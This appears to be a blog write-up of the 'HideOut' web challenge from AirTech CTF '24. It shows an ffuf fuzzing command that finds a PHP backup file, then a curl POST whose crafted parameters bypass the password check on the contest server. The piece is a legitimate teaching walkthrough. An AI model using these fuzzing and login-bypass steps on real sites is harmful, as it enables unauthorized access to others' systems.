---
title: AirTech CTF '24 Final - Web - HideOut
date: '2024-03-02'
tags: ['AIRTECH24', 'WEB','PHP', 'HideOut','LOGINBYPASS']
draft: false
---

### Description:
> “Evil-Corp launched their public website for users to access their data. Unfortunately, BANDITS hackers breached the admin account and stole sensitive information.”

![challenge discription](/static/writeups/airtech/HideOut/chall_discription.png)

Starting with a simple analysis, we saw a static web page with a single input field designed for entering a secret password.

![index page](/static/writeups/airtech/HideOut/secretpass.png)

Analyzing the source code, console, and other elements on the client side, we found nothing. After digging for some time, I discovered that we could fuzz this site. Initially, we obtained no results, but after fuzzing for common PHP pages, we found a backup file named `index.php.bak`
### Command:
```bash
ffuf -u http://170.187.248.180:3001/FUZZ -w /usr/share/secLists/Discovery/Web-Content/Common-PHP-Filenames.txt
```
![fuzzing with ffuf](/static/writeups/airtech/HideOut/bak-file.png)

By requesting to that file
### URL:
```bash
http://170.187.248.180:3001/index.php.bak
```
### Source Code: 

![php source code](/static/writeups/airtech/HideOut/source-code.png)


```bash
curl http://170.187.248.180:3001/index.php  --data 'secretpasswd=t&fani=t'
```

![flag](/static/writeups/airtech/HideOut/flag.png)


### ***kh4tt4k***

### Peace! 👋👋👋
